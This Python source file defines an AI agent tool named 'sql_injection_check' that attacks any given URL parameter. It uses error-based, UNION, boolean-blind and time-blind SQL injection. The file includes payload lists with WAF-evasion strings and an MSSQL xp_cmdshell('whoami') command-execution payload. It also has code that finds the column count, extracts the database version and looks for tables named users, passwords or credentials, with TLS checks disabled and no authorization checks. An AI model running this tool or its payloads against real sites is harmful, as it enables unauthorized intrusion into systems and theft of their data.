"""Advanced SQL injection detection tool. Supports error-based, UNION, blind (boolean + time), WAF bypass."""
import urllib.request
import urllib.parse
import urllib.error
import ssl
import time
import re

TOOL_SCHEMA = {
    "name": "sql_injection_check",
    "description": (
        "Test a URL parameter for SQL injection vulnerabilities. "
        "Supports 4 techniques: error-based, UNION-based column enumeration, "
        "blind boolean-based (response diff), and blind time-based (delay detection). "
        "Includes WAF evasion payloads. Provide the full URL with the parameter to test. "
        "Returns detailed results for each technique with evidence."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "URL with parameter e.g. http://site.com/page?id=1"},
            "param": {"type": "string", "description": "Parameter name to test e.g. id"},
            "technique": {
                "type": "string",
                "enum": ["all", "error", "union", "blind_boolean", "blind_time"],
                "default": "all",
                "description": "SQLi technique to use. Default: all (runs every technique)"
            },
            "dbms": {
                "type": "string",
                "enum": ["auto", "mysql", "postgresql", "mssql", "sqlite", "oracle"],
                "default": "auto",
                "description": "Target DBMS for optimized payloads. Default: auto-detect"
            },
        },
        "required": ["url", "param"],
    },
}

# ── Error-based payloads per DBMS ────────────────────────────
ERROR_PAYLOADS = {
    "generic": [
        "'", "\"", "' OR '1'='1", "1 OR 1=1", "' OR '1'='1'--",
        "' OR '1'='1'/*", "') OR ('1'='1", "1' ORDER BY 1--",
        "' UNION SELECT NULL--", "1; SELECT 1--",
        "' AND 1=CONVERT(int,@@version)--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
    ],
    "mysql": [
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND updatexml(1,concat(0x7e,version()),1)--",
        "' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--",
    ],
    "postgresql": [
        "'; SELECT CAST(version() AS int)--",
        "' AND 1=CAST((SELECT version()) AS int)--",
    ],
    "mssql": [
        "' AND 1=CONVERT(int,@@version)--",
        "'; EXEC xp_cmdshell('whoami')--",
        "' HAVING 1=1--",
    ],
    "sqlite": [
        "' AND 1=CAST((SELECT sqlite_version()) AS int)--",
        "' UNION SELECT sql FROM sqlite_master--",
    ],
}

# ── WAF evasion payloads ─────────────────────────────────────
WAF_BYPASS_PAYLOADS = [
    "' /*!50000OR*/ '1'='1",
    "' %55NION %53ELECT 1--",
    "' uni/**/on sel/**/ect 1--",
    "' OR 1=1#",
    "' oR 1=1--",
    "0' DIV 1 DIV 1--",
    "' /*!UNION*/ /*!SELECT*/ NULL--",
    "%27%20OR%201%3D1--",
    "' AND/**/ 1=1--",
    "' || '1'='1",
]

# ── Error patterns per DBMS ──────────────────────────────────
SQL_ERRORS = {
    "mysql": [
        "sql syntax", "mysql", "you have an error in your sql",
        "warning: mysql", "mysqli", "mysqlnd", "MariaDB",
    ],
    "postgresql": [
        "postgresql", "pg_query", "pg_exec", "psql", "unterminated",
        "syntax error at or near",
    ],
    "mssql": [
        "microsoft sql", "mssql", "odbc", "unclosed quotation",
        "incorrect syntax near", "sqlserver",
    ],
    "sqlite": [
        "sqlite", "sqlite3", "syntax error",
        "unrecognized token", "near",
    ],
    "oracle": [
        "ora-", "oracle", "sp2-", "pls-",
    ],
    "generic": [
        "sql syntax", "syntax error", "unterminated string",
        "sqlstate", "jdbc", "database error", "query failed",
        "warning:", "fatal error",
    ],
}


def is_available() -> bool:
    return True


def _make_request(url: str, timeout: int = 12) -> tuple:
    """Make HTTP request, return (body, status, response_time) or (None, 0, 0) on error."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    try:
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        req.add_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

        start = time.time()
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            body = resp.read(200_000).decode("utf-8", errors="replace")
            elapsed = time.time() - start
            return body, resp.status, elapsed
    except urllib.error.HTTPError as e:
        elapsed = time.time() - start if 'start' in dir() else 0
        try:
            body = e.read(200_000).decode("utf-8", errors="replace")
            return body, e.code, elapsed
        except Exception:
            return None, e.code, elapsed
    except Exception:
        return None, 0, 0


def _inject_param(url: str, param: str, payload: str) -> str:
    """Build URL with injected payload in the specified parameter."""
    parsed = urllib.parse.urlparse(url)
    base_params = urllib.parse.parse_qs(parsed.query)
    base_params[param] = [payload]
    new_query = urllib.parse.urlencode(base_params, doseq=True)
    return parsed._replace(query=new_query).geturl()


def _detect_dbms(body: str) -> str:
    """Detect DBMS from error message."""
    body_lower = body.lower()
    for dbms, patterns in SQL_ERRORS.items():
        if dbms == "generic":
            continue
        for pattern in patterns:
            if pattern.lower() in body_lower:
                return dbms
    return "unknown"


def _test_error_based(url: str, param: str, dbms: str) -> list:
    """Test error-based SQL injection."""
    findings = []
    payloads = ERROR_PAYLOADS["generic"][:]

    if dbms != "auto" and dbms in ERROR_PAYLOADS:
        payloads.extend(ERROR_PAYLOADS[dbms])

    # Also try WAF bypass payloads
    payloads.extend(WAF_BYPASS_PAYLOADS)

    all_errors = []
    for patterns in SQL_ERRORS.values():
        all_errors.extend(patterns)

    detected_dbms = None

    for payload in payloads:
        test_url = _inject_param(url, param, payload)
        body, status, elapsed = _make_request(test_url)

        if body is None:
            continue

        body_lower = body.lower()
        for error in all_errors:
            if error.lower() in body_lower:
                if not detected_dbms:
                    detected_dbms = _detect_dbms(body)

                findings.append({
                    "technique": "error-based",
                    "payload": payload,
                    "evidence": f"DB error detected: '{error}'",
                    "dbms": detected_dbms,
                    "status": status,
                })
                break

    return findings


def _test_union_based(url: str, param: str) -> list:
    """Test UNION-based injection by detecting column count."""
    findings = []

    # Step 1: Find number of columns with ORDER BY
    num_columns = 0
    for i in range(1, 20):
        test_url = _inject_param(url, param, f"' ORDER BY {i}--")
        body, status, elapsed = _make_request(test_url)
        if body is None:
            continue

        body_lower = body.lower()
        # If error appears, previous number was the column count
        has_error = any(e in body_lower for e in ["unknown column", "order by", "error", "out of range"])
        if has_error and i > 1:
            num_columns = i - 1
            break

    if num_columns == 0:
        # Try NULL method
        for i in range(1, 15):
            nulls = ",".join(["NULL"] * i)
            test_url = _inject_param(url, param, f"' UNION SELECT {nulls}--")
            body, status, elapsed = _make_request(test_url)
            if body and status == 200:
                # Check if UNION succeeded (response differs from error)
                err_body, _, _ = _make_request(_inject_param(url, param, f"' UNION SELECT {','.join(['NULL'] * (i+5))}--"))
                if err_body and len(body) != len(err_body or ""):
                    num_columns = i
                    break

    if num_columns > 0:
        findings.append({
            "technique": "UNION-based",
            "payload": f"ORDER BY / UNION SELECT NULL (x{num_columns})",
            "evidence": f"Table has {num_columns} columns - UNION injection possible",
            "columns": num_columns,
        })

        # Step 2: Try to extract version
        nulls = ["NULL"] * num_columns
        for pos in range(num_columns):
            test_nulls = nulls[:]
            test_nulls[pos] = "version()"
            union_payload = f"' UNION SELECT {','.join(test_nulls)}--"
            test_url = _inject_param(url, param, union_payload)
            body, status, elapsed = _make_request(test_url)

            if body:
                # Look for version strings in response
                version_patterns = [
                    r'(\d+\.\d+\.\d+[-\w]*)',  # Generic version
                    r'(MySQL\s+[\d.]+)', r'(PostgreSQL\s+[\d.]+)',
                    r'(Microsoft SQL Server[\d\s.]+)', r'(SQLite\s+[\d.]+)',
                ]
                for vp in version_patterns:
                    match = re.search(vp, body)
                    if match:
                        findings.append({
                            "technique": "UNION-based",
                            "payload": union_payload,
                            "evidence": f"DB Version extracted: {match.group(1)}",
                            "column_position": pos,
                        })
                        break

        # Step 3: Try to extract table names
        for pos in range(num_columns):
            test_nulls = nulls[:]
            test_nulls[pos] = "table_name"
            tables_payload = f"' UNION SELECT {','.join(test_nulls)} FROM information_schema.tables--"
            test_url = _inject_param(url, param, tables_payload)
            body, status, _ = _make_request(test_url)
            if body and status == 200 and len(body) > 100:
                # Look for table names (users, admin, etc.)
                interesting_tables = re.findall(r'(users?|admin|accounts?|passwords?|credentials|members|login|sessions?)', body, re.I)
                if interesting_tables:
                    findings.append({
                        "technique": "UNION-based",
                        "payload": tables_payload,
                        "evidence": f"Interesting tables found: {', '.join(set(interesting_tables))}",
                    })
                break

    return findings


def _test_blind_boolean(url: str, param: str) -> list:
    """Test blind boolean-based SQL injection by comparing response lengths."""
    findings = []

    # Get baseline response
    true_url = _inject_param(url, param, "' OR '1'='1'--")
    false_url = _inject_param(url, param, "' OR '1'='2'--")

    true_body, true_status, _ = _make_request(true_url)
    false_body, false_status, _ = _make_request(false_url)

    if true_body is None or false_body is None:
        return findings

    # Compare response lengths
    len_diff = abs(len(true_body) - len(false_body))
    if len_diff > 50:
        findings.append({
            "technique": "blind-boolean",
            "payload": "' OR '1'='1'-- vs ' OR '1'='2'--",
            "evidence": f"Response length diff: {len_diff} bytes (TRUE={len(true_body)}, FALSE={len(false_body)})",
            "exploitable": True,
        })

    # Try numeric blind
    true_url2 = _inject_param(url, param, "1 AND 1=1")
    false_url2 = _inject_param(url, param, "1 AND 1=2")
    true_body2, _, _ = _make_request(true_url2)
    false_body2, _, _ = _make_request(false_url2)

    if true_body2 and false_body2:
        len_diff2 = abs(len(true_body2) - len(false_body2))
        if len_diff2 > 50:
            findings.append({
                "technique": "blind-boolean",
                "payload": "1 AND 1=1 vs 1 AND 1=2",
                "evidence": f"Numeric blind confirmed. Response diff: {len_diff2} bytes",
                "exploitable": True,
            })

    return findings


def _test_blind_time(url: str, param: str, dbms: str) -> list:
    """Test blind time-based SQL injection with sleep payloads."""
    findings = []

    # DBMS-specific sleep payloads with 5 second delay
    sleep_payloads = {
        "mysql": [
            "' OR SLEEP(5)--",
            "' AND SLEEP(5)--",
            "1' AND (SELECT SLEEP(5))--",
            "' OR (SELECT SLEEP(5) FROM dual)--",
        ],
        "postgresql": [
            "'; SELECT pg_sleep(5)--",
            "' AND (SELECT pg_sleep(5))--",
            "1; SELECT pg_sleep(5)--",
        ],
        "mssql": [
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND 1=1; WAITFOR DELAY '0:0:5'--",
        ],
        "sqlite": [
            "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",
        ],
        "oracle": [
            "' AND 1=dbms_pipe.receive_message('x',5)--",
        ],
    }

    # Determine which payloads to use
    if dbms != "auto" and dbms in sleep_payloads:
        payloads = sleep_payloads[dbms]
    else:
        # Try all
        payloads = []
        for p_list in sleep_payloads.values():
            payloads.extend(p_list)

    # Get baseline response time
    baseline_url = _inject_param(url, param, "1")
    _, _, baseline_time = _make_request(baseline_url)
    if baseline_time == 0:
        baseline_time = 1.0

    for payload in payloads:
        test_url = _inject_param(url, param, payload)
        _, status, elapsed = _make_request(test_url, timeout=15)

        # If response took significantly longer than baseline, likely vulnerable
        if elapsed > baseline_time + 4.0:
            findings.append({
                "technique": "blind-time",
                "payload": payload,
                "evidence": f"Response delayed {elapsed:.1f}s (baseline: {baseline_time:.1f}s) - {elapsed - baseline_time:.1f}s difference",
                "exploitable": True,
            })
            break  # One confirmed is enough

    return findings


async def execute(params: dict) -> str:
    url = params["url"]
    param = params["param"]
    technique = params.get("technique", "all")
    dbms = params.get("dbms", "auto")

    all_findings = []
    techniques_run = []

    # ── Error-based ──────────────────────────────────────────
    if technique in ("all", "error"):
        techniques_run.append("error-based")
        error_findings = _test_error_based(url, param, dbms)
        all_findings.extend(error_findings)

        # Auto-detect DBMS from error results
        if dbms == "auto":
            for f in error_findings:
                if f.get("dbms") and f["dbms"] != "unknown":
                    dbms = f["dbms"]
                    break

    # ── UNION-based ──────────────────────────────────────────
    if technique in ("all", "union"):
        techniques_run.append("UNION-based")
        union_findings = _test_union_based(url, param)
        all_findings.extend(union_findings)

    # ── Blind boolean ────────────────────────────────────────
    if technique in ("all", "blind_boolean"):
        techniques_run.append("blind-boolean")
        bool_findings = _test_blind_boolean(url, param)
        all_findings.extend(bool_findings)

    # ── Blind time-based ─────────────────────────────────────
    if technique in ("all", "blind_time"):
        techniques_run.append("blind-time")
        time_findings = _test_blind_time(url, param, dbms)
        all_findings.extend(time_findings)

    # ── Build output ─────────────────────────────────────────
    if all_findings:
        lines = [
            f"=== SQL INJECTION RESULTS for {param} on {url} ===",
            f"Techniques tested: {', '.join(techniques_run)}",
            f"DBMS detected: {dbms}",
            f"Findings: {len(all_findings)}",
            "",
        ]
        for i, f in enumerate(all_findings, 1):
            lines.append(f"  [{i}] {f['technique'].upper()}")
            lines.append(f"      Payload: {f['payload']}")
            lines.append(f"      Evidence: {f['evidence']}")
            if f.get("exploitable"):
                lines.append(f"      Status: EXPLOITABLE")
            lines.append("")

        lines.append("[!] Parameter is VULNERABLE to SQL injection")
        return "\n".join(lines)

    return (
        f"No SQL injection found for '{param}' on {url}\n"
        f"Techniques tested: {', '.join(techniques_run)}\n"
        f"Note: WAF evasion payloads were also tested."
    )
